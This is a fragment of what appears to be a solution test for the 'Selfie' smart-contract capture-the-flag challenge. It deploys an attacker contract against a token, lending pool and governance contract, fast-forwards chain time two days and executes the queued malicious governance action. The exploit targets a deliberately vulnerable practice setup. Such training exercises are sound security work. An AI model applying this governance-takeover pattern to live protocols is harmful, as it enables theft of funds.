...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackerContract = await (await ethers.getContractFactory("AttackerC6")).connect(attacker).deploy(
            this.token.address,
            this.pool.address,
            this.governance.address
        );
        ...
        // Advance time 2 days so that governance can process action
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await this.governance.executeAction(await attackerContract.actionId());
    });
